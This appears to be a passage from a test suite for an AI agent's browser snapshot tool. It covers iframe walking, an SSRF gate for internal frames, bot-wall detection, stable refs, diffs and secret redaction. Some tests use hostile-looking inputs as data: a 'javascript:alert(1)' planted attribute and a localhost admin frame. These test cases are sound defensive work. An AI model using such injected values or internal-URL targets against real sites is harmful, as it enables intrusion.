      body._children.push(added);
    };
    browserTest.installFakeSessionWithPageForTest("aux-diff", makeFakePage(state));
    setEchoAuxTextResponse({ text: "should-not-be-requested" });
    try {
      // Baseline without config: plain truncation, no aux call.
      await browserSnapshot("aux-diff", {});
      const raw = await browserClick("aux-diff", { ref: "@e1" });
      const parsed = JSON.parse(raw) as { success: boolean; snapshot: string; snapshotMode: string };
      expect(parsed.success).toBe(true);
      expect(parsed.snapshotMode).toBe("diff");
      expect(parsed.snapshot).not.toContain("remainder summarized");
      expect(getEchoAuxTextRequests().length).toBe(0);
    } finally {
      restore();
    }
  });
});

// Iframe visibility: every iframe gets a row; same-origin frames are
// walked INLINE (shared budgets, refs resolved via page.frameLocator),
// cross-origin frames get an opaque [cross-origin] placeholder, and a
// same-origin frame whose document URL fails the SSRF gate keeps a
// [blocked] placeholder with its content rows stripped host-side.
describe("snapshot walker — iframes", () => {
  const makeEl = makeWalkerEl;
  const installFakeDom = installWalkerDom;

  // Fake frame document: enough surface for the walker (body walk), the
  // stamp prescan (querySelectorAll over the frame body), and the
  // host-side URL gate (location.href).
  const makeFrameDoc = (body: WalkerFakeEl, href: string) => ({
    body,
    location: { href },
    querySelectorAll: (sel: string) => body.querySelectorAll(sel)
  });

  const makeFakePage = (opts: { frameLocator?: boolean } = {}): import("playwright-core").Page =>
    ({
      evaluate: <A, R>(fn: (arg: A) => R | Promise<R>, arg?: A): Promise<R> => Promise.resolve(fn(arg as A)),
      locator: (sel: string) => ({ __sel: sel } as unknown),
      ...(opts.frameLocator
        ? {
            frameLocator: (frameSel: string) => ({
              locator: (sel: string) => ({ __frame: frameSel, __sel: sel } as unknown)
            })
          }
        : {})
    } as unknown as import("playwright-core").Page);

  test("walks a same-origin iframe inline: iframe row + in-frame refs chained through frameLocator", async () => {
    const cardInput = makeEl({ tagName: "INPUT", type: "text", value: "", attrs: { "aria-label": "Card number" } });
    const payButton = makeEl({ tagName: "BUTTON", textContent: "Pay now" });
    const frameBody = makeEl({ tagName: "BODY", children: [cardInput, payButton] });
    const iframe = makeEl({
      tagName: "IFRAME",
      attrs: { src: "https://payments.example.com/checkout", name: "checkout" }
    });
    iframe.contentDocument = makeFrameDoc(frameBody, "https://payments.example.com/checkout");
    const mainButton = makeEl({ tagName: "BUTTON", textContent: "Main action" });
    const body = makeEl({ tagName: "BODY", children: [iframe, mainButton] });
    const restore = installFakeDom(body);
    try {
      const result = await browserTest.snapshotForTest(makeFakePage({ frameLocator: true }), false);

      // The iframe itself gets a ref'd row labeled "name|src".
      const frameLine = result.text.split("\n").find((line) => line.includes(" iframe "));
      expect(frameLine).toMatch(/\[@e\d+\] iframe "checkout\|https:\/\/payments\.example\.com\/checkout"/);

      // In-frame content rows are present, indented under the iframe row,
      // with refs of their own.
      expect(result.text).toMatch(/\[@e\d+\] textbox "Card number"/);
      expect(result.text).toMatch(/\[@e\d+\] button "Pay now"/);
      expect(result.text).toMatch(/\[@e\d+\] button "Main action"/);

      // The in-frame button's locator chains through frameLocator on the
      // OWNING iframe's stamp, and the RefTarget is marked framed (no
      // self-healing). The main-frame button stays a flat locator.
      const frameRef = /\[(@e\d+)\] iframe /.exec(result.text)![1]!;
      const payRef = /\[(@e\d+)\] button "Pay now"/.exec(result.text)![1]!;
      const mainRef = /\[(@e\d+)\] button "Main action"/.exec(result.text)![1]!;
      const payTarget = result.refs.get(payRef) as unknown as { locator: { __frame?: string; __sel?: string }; framed?: boolean };
      expect(payTarget.framed).toBe(true);
      expect(payTarget.locator.__frame).toBe(`[data-gini-ref="${frameRef.slice(1)}"]`);
      expect(payTarget.locator.__sel).toBe(`[data-gini-ref="${payRef.slice(1)}"]`);
      const mainTarget = result.refs.get(mainRef) as unknown as { locator: { __frame?: string }; framed?: boolean };
      expect(mainTarget.framed).toBeUndefined();
      expect(mainTarget.locator.__frame).toBeUndefined();
    } finally {
      restore();
    }
  });

  test("cross-origin iframe (contentDocument throws) gets an opaque placeholder row", async () => {
    const iframe = makeEl({
      tagName: "IFRAME",
      attrs: { src: "https://ads.example.net/frame", name: "ads" }
    });
    Object.defineProperty(iframe, "contentDocument", {
      get() {
        throw new Error("Blocked a frame with origin from accessing a cross-origin frame.");
      }
    });
    const body = makeEl({ tagName: "BODY", children: [iframe] });
    const restore = installFakeDom(body);
    try {
      const result = await browserTest.snapshotForTest(makeFakePage(), false);
      expect(result.text).toContain('iframe "ads|https://ads.example.net/frame" [cross-origin]');
      // Placeholder only: no ref on the row, nothing walked from inside.
      expect(result.text).not.toMatch(/\[@e\d+\] iframe/);
      expect(result.refs.size).toBe(0);
    } finally {
      restore();
    }
  });

  test("a same-origin frame whose URL fails the SSRF gate is placeholder-only ([blocked], content stripped)", async () => {
    const stealButton = makeEl({ tagName: "BUTTON", textContent: "Steal state" });
    const frameBody = makeEl({ tagName: "BODY", children: [stealButton] });
    const iframe = makeEl({
      tagName: "IFRAME",
      attrs: { src: "http://127.0.0.1:7777/admin" }
    });
    iframe.contentDocument = makeFrameDoc(frameBody, "http://127.0.0.1:7777/admin");
    const okButton = makeEl({ tagName: "BUTTON", textContent: "Fine" });
    const body = makeEl({ tagName: "BODY", children: [iframe, okButton] });
    const restore = installFakeDom(body);
    try {
      const result = await browserTest.snapshotForTest(makeFakePage(), false);
      expect(result.text).toContain('iframe "http://127.0.0.1:7777/admin" [blocked]');
      // The blocked frame's content never reaches the snapshot text or
      // the refs map; main-frame content is unaffected.
      expect(result.text).not.toContain("Steal state");
      expect(result.text).toMatch(/\[@e\d+\] button "Fine"/);
      for (const target of result.refs.values()) {
        expect((target as unknown as { framed?: boolean }).framed).toBeUndefined();
      }
    } finally {
      restore();
    }
  });

  test("hidden-element budget is shared across frames, not reset per frame", async () => {
    const mainHidden: WalkerFakeEl[] = [];
    for (let i = 0; i < 30; i++) {
      mainHidden.push(makeEl({ tagName: "BUTTON", visible: false, textContent: `main-${i}` }));
    }
    const frameHidden: WalkerFakeEl[] = [];
    for (let i = 0; i < 30; i++) {
      frameHidden.push(makeEl({ tagName: "BUTTON", visible: false, textContent: `frame-${i}` }));
    }
    const frameBody = makeEl({ tagName: "BODY", children: frameHidden });
    const iframe = makeEl({ tagName: "IFRAME", attrs: { src: "https://widgets.example.com/w" } });
    iframe.contentDocument = makeFrameDoc(frameBody, "https://widgets.example.com/w");
    const body = makeEl({ tagName: "BODY", children: [...mainHidden, iframe] });
    const restore = installFakeDom(body);
    try {
      const result = await browserTest.snapshotForTest(makeFakePage(), false);
      const hiddenLines = result.text.split("\n").filter((line) => line.includes("[hidden]") && !line.includes(" iframe "));
      // 60 hidden across both documents against the shared budget of 50.
      expect(hiddenLines.length).toBe(50);
      expect(result.text).toContain("[...hidden truncated +10 more hidden]");
    } finally {
      restore();
    }
  });

  test("a hidden iframe gets a placeholder row and is not walked", async () => {
    const frameBody = makeEl({
      tagName: "BODY",
      children: [makeEl({ tagName: "BUTTON", textContent: "Inside hidden frame" })]
    });
    const iframe = makeEl({ tagName: "IFRAME", visible: false, attrs: { src: "https://tracker.example.com/px" } });
    iframe.contentDocument = makeFrameDoc(frameBody, "https://tracker.example.com/px");
    const body = makeEl({ tagName: "BODY", children: [iframe] });
    const restore = installFakeDom(body);
    try {
      const result = await browserTest.snapshotForTest(makeFakePage(), false);
      expect(result.text).toContain('iframe "https://tracker.example.com/px" [hidden]');
      expect(result.text).not.toContain("Inside hidden frame");
    } finally {
      restore();
    }
  });

  test("nth ordinals are frame-local so main-frame healing is not skewed by same-name framed entries", async () => {
    // A framed "Submit" button is emitted BEFORE the main-frame one.
    // Healing re-queries page.getByRole, which searches the main frame
    // only — there the main-frame button is the first (and only) match,
    // so its recorded nth must be 0, not inflated by the framed entry.
    const frameButton = makeEl({ tagName: "BUTTON", textContent: "Submit" });
    const frameBody = makeEl({ tagName: "BODY", children: [frameButton] });
    const iframe = makeEl({ tagName: "IFRAME", attrs: { src: "https://forms.example.com/f" } });
    iframe.contentDocument = makeFrameDoc(frameBody, "https://forms.example.com/f");
    const mainButton = makeEl({ tagName: "BUTTON", textContent: "Submit" });
    const body = makeEl({ tagName: "BODY", children: [iframe, mainButton] });
    const restore = installFakeDom(body);
    try {
      const result = await browserTest.snapshotForTest(makeFakePage({ frameLocator: true }), false);
      const targets = [...result.refs.values()] as Array<{ role: string; name: string; nth: number; framed?: boolean }>;
      const framedSubmit = targets.find((t) => t.name === "Submit" && t.framed);
      const mainSubmit = targets.find((t) => t.name === "Submit" && !t.framed);
      expect(framedSubmit?.nth).toBe(0);
      expect(mainSubmit?.nth).toBe(0);
    } finally {
      restore();
    }
  });

  test("framed refs never self-heal: a lost in-frame stamp fails loudly without querying the main frame", async () => {
    let healingQueried = 0;
    const fakePage = {
      url: () => "https://example.com/",
      title: async () => "Example",
      waitForLoadState: async () => undefined,
      evaluate: async () => ({ entries: [], hiddenEmitted: 0, hiddenTotal: 0, hiddenBudget: 0 }),
      getByRole: () => {
        healingQueried++;
        return { nth: () => ({ count: async () => 1 }) };
      },
      getByText: () => {
        healingQueried++;
        return { nth: () => ({ count: async () => 1 }) };
      }
    } as unknown as Partial<import("playwright-core").Page>;
    browserTest.installFakeSessionWithPageForTest("framed-no-heal", fakePage);
    const refs = new Map<string, unknown>();
    // Stamp lost: count() resolves 0. A main-frame target would heal via
    // getByRole; a framed target must fail instead.
    refs.set("@e5", {
      locator: { count: async () => 0, click: async () => undefined },
      role: "button",
      name: "Pay now",
      nth: 0,
      framed: true
    });
    browserTest.setFakeSessionRefsForTest("framed-no-heal", refs);
    try {
      const raw = await browserClick("framed-no-heal", { ref: "@e5" });
      const parsed = JSON.parse(raw) as { success: boolean; error?: string };
      expect(parsed.success).toBe(false);
      expect(parsed.error).toContain("Unknown ref @e5");
      expect(healingQueried).toBe(0);
    } finally {
      browserTest.clearFakeSessionsForTest();
      browserTest.setInFlightDisconnectsForTest(0);
    }
  });
});

// Bot-wall detection: a challenge interstitial (Cloudflare "Just a
// moment...", captcha-provider iframes) never changes on re-snapshot, so
// snapshot results must flag botWallSuspected + a warning that stops the
// model from re-snapshotting in a loop. The heuristic requires a title
// match or a challenge-provider iframe row — body text merely mentioning
// CAPTCHAs must not trigger it.
describe("bot-wall detection", () => {
  const makeEl = makeWalkerEl;
  const installFakeDom = installWalkerDom;
  const makeFakePage = (title: string): import("playwright-core").Page =>
    ({
      url: () => "https://example.com/",
      title: async () => title,
      evaluate: <A, R>(fn: (arg: A) => R | Promise<R>, arg?: A): Promise<R> => Promise.resolve(fn(arg as A)),
      locator: (sel: string) => ({ __sel: sel } as unknown)
    } as unknown as import("playwright-core").Page);

  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
  });

  test("Cloudflare-style interstitial title rides the snapshot result as botWallSuspected + warning", async () => {
    const body = makeEl({ tagName: "BODY", children: [makeEl({ tagName: "BUTTON", textContent: "Retry" })] });
    const restore = installFakeDom(body);
    const page = makeFakePage("Just a moment...");
    browserTest.installFakeSessionWithPageForTest("botwall-title", page as Partial<import("playwright-core").Page>);
    try {
      const raw = await browserSnapshot("botwall-title", {});
      const parsed = JSON.parse(raw) as { success: boolean; botWallSuspected?: boolean; warning?: string };
      expect(parsed.success).toBe(true);
      expect(parsed.botWallSuspected).toBe(true);
      expect(parsed.warning).toContain("bot-detection challenge");
    } finally {
      restore();
    }
  });

  test("a captcha-provider iframe flags botWallSuspected even under a benign title", async () => {
    // Cross-origin captcha frame: no contentDocument, so the walker emits
    // an opaque placeholder row whose label carries the src.
    const iframe = makeEl({
      tagName: "IFRAME",
      attrs: { src: "https://challenges.cloudflare.com/turnstile/v0/challenge", title: "Widget containing a security challenge" }
    });
    const body = makeEl({ tagName: "BODY", children: [iframe] });
    const restore = installFakeDom(body);
    try {
      const result = await browserTest.snapshotForTest(makeFakePage("example.com"), false);
      expect(result.botWallSuspected).toBe(true);
    } finally {
      restore();
    }
  });

  test("a page merely mentioning CAPTCHAs in title-adjacent body text is not flagged", async () => {
    // Article ABOUT captchas: the trigger phrase appears in a link's
    // accessible name and the title names captchas, but there is no
    // challenge title phrase and no challenge-provider iframe.
    const link = makeEl({
      tagName: "A",
      attrs: { href: "https://blog.example.com/captcha" },
      textContent: "Verify you are human — how CAPTCHAs work"
    });
    const body = makeEl({ tagName: "BODY", children: [link] });
    const restore = installFakeDom(body);
    try {
      const result = await browserTest.snapshotForTest(makeFakePage("The history of CAPTCHA tests"), false);
      expect(result.text).toContain("Verify you are human");
      expect(result.botWallSuspected).toBe(false);
    } finally {
      restore();
    }
  });
});

// Feature coverage for stable refs + post-action snapshot diffing: the
// walker reuses an element's existing data-gini-ref stamp across
// snapshots (new ids only for unstamped elements, allocation never
// reuses a retired id), stamps/numbering reset only on navigation, and
// action handlers return a line diff against the previous redacted
// snapshot when the change is small. Explicit browser_snapshot always
// returns the full tree.
describe("snapshot stable refs and post-action diffs", () => {
  type FakeEl = WalkerFakeEl;
  const makeEl = makeWalkerEl;
  const installFakeDom = installWalkerDom;
  // Fake Page whose evaluate(fn, arg) runs fn(arg) locally and whose
  // locator(sel) returns a stub locator with a click() that invokes the
  // test-provided mutation — so browserClick can "change the page".
  const makeFakePage = (state: { url: string; onClick?: () => void }): import("playwright-core").Page =>
    ({
      url: () => state.url,
      title: async () => "Example",
      waitForLoadState: async () => undefined,
      evaluate: <A, R>(fn: (arg: A) => R | Promise<R>, arg?: A): Promise<R> => Promise.resolve(fn(arg as A)),
      locator: (sel: string) => ({
        __sel: sel,
        click: async (_opts?: { timeout?: number }) => {
          state.onClick?.();
        }
      })
    } as unknown as import("playwright-core").Page);

  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
  });

  test("an element keeps its ref across snapshots; new elements allocate new higher ids", async () => {
    const save = makeEl({ tagName: "BUTTON", textContent: "Save" });
    const email = makeEl({ tagName: "INPUT", type: "text", value: "", attrs: { placeholder: "Email" } });
    const body = makeEl({ tagName: "BODY", children: [save, email] });
    const restore = installFakeDom(body);
    const page = makeFakePage({ url: "https://example.com/" });
    try {
      const first = await browserTest.snapshotForTest(page, false);
      expect(first.text).toContain('[@e1] button "Save"');
      expect(first.text).toContain('[@e2] textbox "Email"');

      const del = makeEl({ tagName: "BUTTON", textContent: "Delete" });
      del.parentElement = body;
      body._children.push(del);

      const second = await browserTest.snapshotForTest(page, false);
      expect(second.text).toContain('[@e1] button "Save"');
      expect(second.text).toContain('[@e2] textbox "Email"');
      expect(second.text).toContain('[@e3] button "Delete"');
      expect(second.refs.has("@e1")).toBe(true);
      expect(second.refs.has("@e3")).toBe(true);
    } finally {
      restore();
    }
  });

  test("a removed element's id is never reused; navigation clears stamps and restarts at @e1", async () => {
    const one = makeEl({ tagName: "BUTTON", textContent: "One" });
    const two = makeEl({ tagName: "BUTTON", textContent: "Two" });
    const body = makeEl({ tagName: "BODY", children: [one, two] });
    const restore = installFakeDom(body);
    const state = { url: "https://a.example/" };
    const page = makeFakePage(state);
    browserTest.installFakeSessionWithPageForTest("ref-nav-task", page as Partial<import("playwright-core").Page>);
    try {
      const first = await browserTest.snapshotForTest(page, false, "ref-nav-task");
      expect(first.text).toContain('[@e1] button "One"');
      expect(first.text).toContain('[@e2] button "Two"');

      // Remove "One" and add "Three": Two keeps @e2, Three gets a fresh
      // @e3 — the retired @e1 is NOT handed to a different element.
      body._children.splice(0, 1);
      const three = makeEl({ tagName: "BUTTON", textContent: "Three" });
      three.parentElement = body;
      body._children.push(three);
      const second = await browserTest.snapshotForTest(page, false, "ref-nav-task");
      expect(second.navigated).toBe(false);
      expect(second.text).toContain('[@e2] button "Two"');
      expect(second.text).toContain('[@e3] button "Three"');
      expect(second.text).not.toContain("[@e1]");

      // URL change = navigation: stamps cleared, numbering restarts.
      state.url = "https://b.example/";
      const third = await browserTest.snapshotForTest(page, false, "ref-nav-task");
      expect(third.navigated).toBe(true);
      expect(third.text).toContain('[@e1] button "Two"');
      expect(third.text).toContain('[@e2] button "Three"');
    } finally {
      restore();
    }
  });

  test("a duplicate (cloned) stamp is restamped with a fresh id", async () => {
    // cloneNode copies attributes, so a cloned subtree carries the same
    // stamp as its source; two elements sharing a ref would break
    // strict-mode resolution. Only the first holder keeps the id.
    const orig = makeEl({ tagName: "BUTTON", textContent: "Card", attrs: { "data-gini-ref": "e1" } });
    const clone = makeEl({ tagName: "BUTTON", textContent: "Card", attrs: { "data-gini-ref": "e1" } });
    const body = makeEl({ tagName: "BODY", children: [orig, clone] });
    const restore = installFakeDom(body);
    const page = makeFakePage({ url: "https://example.com/" });
    try {
      const result = await browserTest.snapshotForTest(page, false);
      expect(result.text).toContain('[@e1] button "Card"');
      expect(result.text).toContain('[@e2] button "Card"');
      expect(orig._attrs["data-gini-ref"]).toBe("e1");
      expect(clone._attrs["data-gini-ref"]).toBe("e2");
    } finally {
      restore();
    }
  });

  test("a well-formed but oversized planted stamp neither sticks nor poisons the allocator", async () => {
    // Number("9007199254740991") + 1 stops incrementing at float
    // precision, so an unbounded scan would make every fresh allocation
    // collide on one id. Ids beyond 9 digits are treated as unstamped.
    const planted = makeEl({ tagName: "BUTTON", textContent: "Huge", attrs: { "data-gini-ref": "e9007199254740991" } });
    const next = makeEl({ tagName: "BUTTON", textContent: "Next" });
    const body = makeEl({ tagName: "BODY", children: [planted, next] });
    const restore = installFakeDom(body);
    const page = makeFakePage({ url: "https://example.com/" });
    try {
      const result = await browserTest.snapshotForTest(page, false);
      expect(result.text).toContain('[@e1] button "Huge"');
      expect(result.text).toContain('[@e2] button "Next"');
      expect(planted._attrs["data-gini-ref"]).toBe("e1");
    } finally {
      restore();
    }
  });

  test("a stamp that doesn't match the e<N> format is never honored", async () => {
    // Only the walker writes well-formed stamps; any other value means
    // the page set the attribute itself, and honoring it would let page
    // content pick its own ref. It gets overwritten with a fresh id.
    const bogus = makeEl({ tagName: "BUTTON", textContent: "Planted", attrs: { "data-gini-ref": "javascript:alert(1)" } });
    const body = makeEl({ tagName: "BODY", children: [bogus] });
    const restore = installFakeDom(body);
    const page = makeFakePage({ url: "https://example.com/" });
    try {
      const result = await browserTest.snapshotForTest(page, false);
      expect(result.text).toContain('[@e1] button "Planted"');
      expect(bogus._attrs["data-gini-ref"]).toBe("e1");
    } finally {
      restore();
    }
  });

  // Builds a 20-button page so the diff threshold has room to work with
  // (the fixed diff header would dwarf a tiny page's full snapshot and
  // force full mode regardless of the change size).
  const makeButtonRows = (count: number): FakeEl[] => {
    const rows: FakeEl[] = [];
    for (let i = 1; i <= count; i++) {
      rows.push(makeEl({ tagName: "BUTTON", textContent: `Item${String(i).padStart(2, "0")}` }));
    }
    return rows;
  };

  test("post-action snapshot returns a diff when the change is small", async () => {
    const body = makeEl({ tagName: "BODY", children: makeButtonRows(20) });
    const restore = installFakeDom(body);
    const state: { url: string; onClick?: () => void } = { url: "https://example.com/" };
    state.onClick = () => {
      const added = makeEl({ tagName: "BUTTON", textContent: "NewButton" });
      added.parentElement = body;
      body._children.push(added);
    };
    const page = makeFakePage(state);
    browserTest.installFakeSessionWithPageForTest("diff-small", page as Partial<import("playwright-core").Page>);
    try {
      const baseline = JSON.parse(await browserSnapshot("diff-small", {})) as { success: boolean; snapshot: string };
      expect(baseline.success).toBe(true);
      expect(baseline.snapshot).toContain('[@e1] button "Item01"');

      const raw = await browserClick("diff-small", { ref: "@e1" });
      const parsed = JSON.parse(raw) as { success: boolean; snapshot: string; snapshotMode: string };
      expect(parsed.success).toBe(true);
      expect(parsed.snapshotMode).toBe("diff");
      expect(parsed.snapshot).toContain("[diff vs previous snapshot");
      // The "+ " marker is followed by the line's own depth indent.
      expect(parsed.snapshot).toMatch(/\+\s+\[@e21\] button "NewButton"/);
      // Unchanged lines far from the change are omitted.
      expect(parsed.snapshot).not.toContain("Item05");
    } finally {
      restore();
    }
  });

  test("post-action snapshot returns the full tree when the change is large", async () => {
    const body = makeEl({ tagName: "BODY", children: makeButtonRows(3) });
    const restore = installFakeDom(body);
    const state: { url: string; onClick?: () => void } = { url: "https://example.com/" };
    state.onClick = () => {
      const fresh: FakeEl[] = [];
      for (let i = 1; i <= 8; i++) {
        fresh.push(makeEl({ tagName: "BUTTON", textContent: `Other${i}` }));
      }
      for (const el of fresh) el.parentElement = body;
      body._children.splice(0, body._children.length, ...fresh);
    };
    const page = makeFakePage(state);
    browserTest.installFakeSessionWithPageForTest("diff-large", page as Partial<import("playwright-core").Page>);
    try {
      await browserSnapshot("diff-large", {});
      const raw = await browserClick("diff-large", { ref: "@e1" });
      const parsed = JSON.parse(raw) as { success: boolean; snapshot: string; snapshotMode: string };
      expect(parsed.success).toBe(true);
      expect(parsed.snapshotMode).toBe("full");
      expect(parsed.snapshot).not.toContain("[diff vs previous snapshot");
      expect(parsed.snapshot).toContain('button "Other1"');
    } finally {
      restore();
    }
  });

  test("first snapshot after a navigation is full even from an action handler", async () => {
    const body = makeEl({ tagName: "BODY", children: makeButtonRows(20) });
    const restore = installFakeDom(body);
    const state: { url: string; onClick?: () => void } = { url: "https://example.com/" };
    state.onClick = () => {
      state.url = "https://example.com/next";
    };
    const page = makeFakePage(state);
    browserTest.installFakeSessionWithPageForTest("diff-nav", page as Partial<import("playwright-core").Page>);
    try {
      await browserSnapshot("diff-nav", {});
      const raw = await browserClick("diff-nav", { ref: "@e1" });
      const parsed = JSON.parse(raw) as { success: boolean; snapshot: string; snapshotMode: string };
      expect(parsed.success).toBe(true);
      expect(parsed.snapshotMode).toBe("full");
      expect(parsed.snapshot).not.toContain("[diff vs previous snapshot");
      expect(parsed.snapshot).toContain('[@e1] button "Item01"');
    } finally {
      restore();
    }
  });

  test("explicit browser_snapshot always returns the full tree", async () => {
    const body = makeEl({ tagName: "BODY", children: makeButtonRows(20) });
    const restore = installFakeDom(body);
    const page = makeFakePage({ url: "https://example.com/" });
    browserTest.installFakeSessionWithPageForTest("snap-full", page as Partial<import("playwright-core").Page>);
    try {
      await browserSnapshot("snap-full", {});
      // Mutate the page between snapshots — explicit re-snapshot still
      // returns every line, never a diff.
      const added = makeEl({ tagName: "BUTTON", textContent: "NewButton" });
      added.parentElement = body;
      body._children.push(added);
      const raw = await browserSnapshot("snap-full", {});
      const parsed = JSON.parse(raw) as { success: boolean; snapshot: string; snapshotMode?: string };
      expect(parsed.success).toBe(true);
      expect(parsed.snapshotMode).toBeUndefined();
      expect(parsed.snapshot).not.toContain("[diff vs previous snapshot");
      expect(parsed.snapshot).toContain('[@e1] button "Item01"');
      expect(parsed.snapshot).toContain('[@e21] button "NewButton"');
    } finally {
      restore();
    }
  });

  test("diff text is computed after redaction — registered secret bytes never appear", async () => {
    const secret = "hunter2-secret-value";
    // A data-gini-secret-stamped input feeds the live-DOM secret
    // collector; a plain Notes input receives the secret bytes on click,
    // simulating a page that copies typed credentials around.
    const secretInput = makeEl({
      tagName: "INPUT",
      type: "text",
      value: secret,
      attrs: { "data-gini-secret": "true", placeholder: "Password" }
    });
    const notes = makeEl({ tagName: "INPUT", type: "text", value: "", attrs: { placeholder: "Notes" } });
    const body = makeEl({ tagName: "BODY", children: [...makeButtonRows(20), secretInput, notes] });
    const restore = installFakeDom(body);
    const state: { url: string; onClick?: () => void } = { url: "https://example.com/" };
    state.onClick = () => {
      notes.value = secret;
    };
    const page = makeFakePage(state);
    browserTest.installFakeSessionWithPageForTest("diff-redact", page as Partial<import("playwright-core").Page>);
    try {
      const baseline = JSON.parse(await browserSnapshot("diff-redact", {})) as { snapshot: string };
      expect(baseline.snapshot).not.toContain(secret);

      const raw = await browserClick("diff-redact", { ref: "@e1" });
      expect(raw).not.toContain(secret);
      const parsed = JSON.parse(raw) as { success: boolean; snapshot: string; snapshotMode: string };
      expect(parsed.success).toBe(true);
      expect(parsed.snapshotMode).toBe("diff");
      expect(parsed.snapshot).toMatch(/\+\s+\[@e22\] textbox "Notes" value="\[redacted\]"/);
    } finally {
      restore();
    }
  });

  test("a full=true snapshot does not poison the post-action diff base", async () => {
    // full=true trees carry landmark/heading rows that full=false trees
    // (and every post-action snapshot) lack; diffing against one would
    // render each landmark as a spurious removal.
    const heading = makeEl({ tagName: "H1", textContent: "Dashboard" });
    const body = makeEl({ tagName: "BODY", children: [heading, ...makeButtonRows(20)] });
    const restore = installFakeDom(body);
    const state: { url: string; onClick?: () => void } = { url: "https://example.com/" };
    state.onClick = () => {
      const added = makeEl({ tagName: "BUTTON", textContent: "NewButton" });
      added.parentElement = body;
      body._children.push(added);
    };
    const page = makeFakePage(state);
    browserTest.installFakeSessionWithPageForTest("diff-fullbase", page as Partial<import("playwright-core").Page>);
    try {
      await browserSnapshot("diff-fullbase", {});
      const full = JSON.parse(await browserSnapshot("diff-fullbase", { full: true })) as { snapshot: string };
      expect(full.snapshot).toContain('heading "Dashboard"');

      const raw = await browserClick("diff-fullbase", { ref: "@e1" });
      const parsed = JSON.parse(raw) as { success: boolean; snapshot: string; snapshotMode: string };
      expect(parsed.success).toBe(true);
      expect(parsed.snapshotMode).toBe("diff");
      expect(parsed.snapshot).toMatch(/\+\s+\[@e21\] button "NewButton"/);
      expect(parsed.snapshot).not.toContain('- heading "Dashboard"');
    } finally {
      restore();
    }
  });
});

describe("renderSnapshotDiff formatting", () => {
  test("identical snapshots render an explicit '(no changes)' body", () => {
    const text = 'button "Save"\nbutton "Cancel"';
    const diff = browserTest.renderSnapshotDiffForTest(text, text);
    expect(diff).toBeDefined();
    expect(diff!).toContain("[diff vs previous snapshot");
    expect(diff!).toContain("(no changes)");
  });

  test("non-contiguous hunks are separated by a gap marker", () => {
    const prevLines = Array.from({ length: 12 }, (_, i) => `line${i}`);
    const currLines = [...prevLines];
    currLines[1] = "changedA";
    currLines[10] = "changedB";
    const diff = browserTest.renderSnapshotDiffForTest(prevLines.join("\n"), currLines.join("\n"));
    expect(diff!).toContain("+ changedA");
    expect(diff!).toContain("+ changedB");
    // Without the marker, two distant changes read as neighboring lines.
    expect(diff!).toContain("⋯");
  });

  test("an over-budget changed middle bails out instead of running the quadratic LCS", () => {
    const a = Array.from({ length: 1100 }, (_, i) => `a${i}`).join("\n");
    const b = Array.from({ length: 1100 }, (_, i) => `b${i}`).join("\n");
    expect(browserTest.renderSnapshotDiffForTest(a, b)).toBeUndefined();
  });
});

// Stale-ref self-healing: when an SPA re-render destroys the stamped
// [data-gini-ref] node, action tools re-query by the role/name/nth
// recorded at snapshot time, restamp the survivor with the SAME id, and
// flag healedRef in the result. fill_secrets and upload stay fail-loud
// on the exact stamped element (trust boundary — see ADR
// browser-fill-secret.md).
describe("stale-ref self-healing", () => {
  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
  });

  // Fake page for healing tests. The walker evaluate returns an empty
  // page (post-action snapshot content isn't under test here);
  // getByRole/getByText record their arguments and hand back the
  // supplied candidate (default: a candidate matching nothing).
  function makeHealPage(opts: {
    roleCandidate?: Record<string, unknown>;
    textCandidate?: Record<string, unknown>;
  }) {
    const calls = {
      getByRole: [] as Array<{ role: string; options?: Record<string, unknown>; nth?: number }>,
      getByText: [] as Array<{ text: string; options?: Record<string, unknown>; nth?: number }>,
      locator: [] as string[]
    };
    // page.locator stubs record actions per selector — after a heal the
    // action runs through the freshly-stamped selector, not the
    // role/text candidate, and tests assert it landed there.
    type LocatorStub = {
      __sel: string;
      clicks: Array<{ timeout?: number } | undefined>;
      waits: Array<{ state?: string; timeout?: number } | undefined>;
      click(o?: { timeout?: number }): Promise<void>;
      waitFor(o?: { state?: string; timeout?: number }): Promise<void>;
    };
    const locatorStubs = new Map<string, LocatorStub>();
    const locatorOf = (sel: string): LocatorStub => {
      let stub = locatorStubs.get(sel);
      if (!stub) {
        const made: LocatorStub = {
          __sel: sel,
          clicks: [],
          waits: [],
          click: async (o?: { timeout?: number }) => {
            made.clicks.push(o);
          },
          waitFor: async (o?: { state?: string; timeout?: number }) => {
            made.waits.push(o);
          }
        };
        locatorStubs.set(sel, made);
        stub = made;
      }
      return stub;
    };
    const page = {
      url: () => "https://example.com/app",
      title: async () => "App",
      waitForLoadState: async () => undefined,
      evaluate: async () => ({ entries: [], hiddenEmitted: 0, hiddenTotal: 0, hiddenBudget: 0 }),
      locator: (sel: string) => {
        calls.locator.push(sel);
        return locatorOf(sel);
      },
      getByRole: (role: string, options?: Record<string, unknown>) => {
        const entry = { role, options, nth: undefined as number | undefined };
        calls.getByRole.push(entry);
        return {
          nth: (n: number) => {
            entry.nth = n;
            return opts.roleCandidate ?? { count: async () => 0 };
          }
        };
      },
      getByText: (text: string, options?: Record<string, unknown>) => {
        const entry = { text, options, nth: undefined as number | undefined };
        calls.getByText.push(entry);
        return {
          nth: (n: number) => {
            entry.nth = n;
            return opts.textCandidate ?? { count: async () => 0 };
          }
        };
      }
    };
    return { page: page as unknown as Partial<import("playwright-core").Page>, calls, locatorOf };
  }

  // A healing candidate that exists (count 1) and records the action +
  // restamp landing on it. Its evaluate runs the supplied closure against
  // a fake element (with a getComputedStyle window shim), so the real
  // verdict checks — foreign stamp, cursor interactivity — are exercised.
  function makeCandidate(init?: {
    stamp?: string;
    cursor?: string;
    onclick?: boolean;
    tabindex?: string;
  }) {
    const record = {
      clicks: [] as Array<{ timeout?: number } | undefined>,
      waits: [] as Array<{ state?: string; timeout?: number } | undefined>,
      restamps: [] as Array<{ attr: string; id: string }>
    };
    const attrs = new Map<string, string>();
    if (init?.stamp !== undefined) attrs.set("data-gini-ref", init.stamp);
    if (init?.onclick) attrs.set("onclick", "void 0");
    if (init?.tabindex !== undefined) attrs.set("tabindex", init.tabindex);
    const el = {
      getAttribute: (name: string) => attrs.get(name) ?? null,
      setAttribute: (name: string, value: string) => {
        attrs.set(name, value);
        record.restamps.push({ attr: name, id: value });
      }
